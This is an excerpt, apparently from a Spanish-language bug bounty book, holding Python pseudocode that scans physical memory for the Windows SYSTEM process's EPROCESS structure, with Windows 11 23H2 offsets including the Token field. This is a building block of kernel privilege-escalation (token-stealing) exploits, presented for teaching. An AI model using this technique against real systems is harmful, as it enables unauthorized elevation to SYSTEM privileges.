# Extraído de: LibroBugBounty/cap-11-kernel-rw.md
# Pseudocódigo: escaneo de memoria física para encontrar EPROCESS
# Los offsets son para Windows 11 23H2 (build 22631)

OFFSET_PID = 0x440          # UniqueProcessId en EPROCESS
OFFSET_ACTIVE_LINKS = 0x448 # ActiveProcessLinks
OFFSET_TOKEN = 0x4B8        # Token (_EX_FAST_REF)
OFFSET_IMAGE_NAME = 0x5A8   # ImageFileName (15 chars)

def scan_for_system_eprocess(phys_memory, scan_size=0x10000000):
    """Escanea memoria física buscando EPROCESS de SYSTEM."""
    page_size = 0x1000
    for offset in range(0, scan_size, page_size):
        page = phys_memory.read(offset, page_size)
        # Buscar patrón: PID = 4 seguido de ActiveProcessLinks válidos
        for i in range(0, len(page) - 0x600, 8):
            pid = int.from_bytes(page[i + OFFSET_PID:i + OFFSET_PID + 8], 'little')
            if pid == 4:
                # Verificar que ImageFileName sea "System\x00..."
                name = page[i + OFFSET_IMAGE_NAME:i + OFFSET_IMAGE_NAME + 6]
                if name == b'System':
                    return offset + i
    return None
